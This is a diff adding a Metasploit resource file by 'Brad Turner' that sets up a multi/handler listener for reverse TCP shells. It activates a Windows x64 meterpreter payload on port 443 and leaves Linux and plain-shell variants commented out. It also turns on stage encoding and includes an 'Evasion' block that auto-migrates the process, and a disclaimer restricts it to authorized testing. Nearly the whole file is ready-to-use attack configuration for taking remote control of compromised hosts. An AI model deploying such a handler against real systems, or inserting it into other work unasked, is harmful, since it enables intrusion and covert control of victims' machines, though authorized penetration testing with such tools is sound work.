@@ -1,0 +1,43 @@
+# Metasploit Resource File - Reverse TCP Handler
+# Usage: msfconsole -r reverse_tcp_handler.rc
+# Author: Brad Turner
+#
+# DISCLAIMER: For authorized security testing only. Do not use against systems
+# without explicit written permission. The author assumes no liability for
+# misuse. You are responsible for compliance with all applicable laws.
+#==============================================================================
+
+# Set up multi/handler for reverse shell
+use exploit/multi/handler
+
+# === WINDOWS METERPRETER ===
+set payload windows/x64/meterpreter/reverse_tcp
+# set payload windows/meterpreter/reverse_tcp  # Use for 32-bit
+
+# === LINUX METERPRETER ===
+# set payload linux/x64/meterpreter/reverse_tcp
+
+# === BASIC SHELLS (no meterpreter) ===
+# set payload windows/x64/shell_reverse_tcp
+# set payload linux/x64/shell_reverse_tcp
+
+# Connection settings - CHANGE THESE
+set LHOST 0.0.0.0
+set LPORT 443
+
+# Handler options
+set ExitOnSession false
+set EnableStageEncoding true
+
+# Evasion
+set AutoRunScript post/windows/manage/migrate
+
+# Run handler
+exploit -j
+
+# Additional handlers (uncomment if needed)
+# use exploit/multi/handler
+# set payload windows/x64/shell_reverse_tcp
+# set LPORT 4444
+# exploit -j
+
